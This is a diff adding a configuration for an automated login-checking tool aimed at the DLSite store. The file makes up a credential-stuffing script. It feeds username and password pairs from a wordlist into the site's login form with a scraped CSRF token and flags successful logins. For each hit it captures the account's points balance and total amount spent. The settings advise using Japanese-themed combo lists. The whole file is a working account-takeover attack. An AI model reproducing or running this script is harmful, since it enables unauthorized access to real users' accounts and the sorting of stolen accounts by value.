@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "DLSite",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-18T15:42:06.2183142+00:00",
+  "AdditionalInfo": "Use weeb / jap lists",
+  "Author": "Ruri&Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_Main_Page REQUEST GET "http://www.dlsite.com/ecchi-eng/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#GET_LOGIN_PAGE REQUEST GET "https://ssl.dlsite.com/ecchi-eng/login/=/skip_register/1" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: http://www.dlsite.com/ecchi-eng/" 
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[name=_token]" "value" 0 -> VAR "TOKEN" "" "" 
+#LOGIN REQUEST POST "https://login.dlsite.com/login" AutoRedirect=TRUE 
+  CONTENT "login_id=<USER>&password=<PASS>&_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://login.dlsite.com/login" 
+  HEADER "origin: https://login.dlsite.com" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "ログインIDかパスワードが間違っています" 
+    KEY "password combination you entered is incorrect" 
+  KEYCHAIN Success OR 
+    KEY ">Log Out<" 
+    KEY "You have successfully logged in" 
+#GET_My_Page REQUEST GET "https://ssl.dlsite.com/ecchi-eng/mypage" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: http://www.dlsite.com/ecchi-eng/" 
+#PARSE_points PARSE "<SOURCE>" LR "span class=\"work_point\"><strong>" "</strong>&nbsp;points</span>" Recursive=FALSE -> CAP "Points" "" "" 
+#GET_Purchased REQUEST GET "https://ssl.dlsite.com/ecchi-eng/mypage/userbuy/complete" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://ssl.dlsite.com/ecchi-eng/mypage" 
+#POST_All_Purchased REQUEST POST "https://ssl.dlsite.com/index.php" AutoRedirect=TRUE 
+  CONTENT "_layout=mypage_userbuy_complete&_form_id=mypageUserbuyCompleteForm&_site=ecchieng&_view=input&type=0&start=all&start_to_end=0&end=&sort=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://ssl.dlsite.com/ecchi-eng/mypage/userbuy/complete" 
+  HEADER "origin: https://ssl.dlsite.com" 
+#PARSE_Total_Spent PARSE "<SOURCE>" LR "Charge (Total)</strong></dt><dd><strong class=\"work_price\">" "</strong></dd></dl>" Recursive=FALSE -> CAP "Total Spent" "" "" 
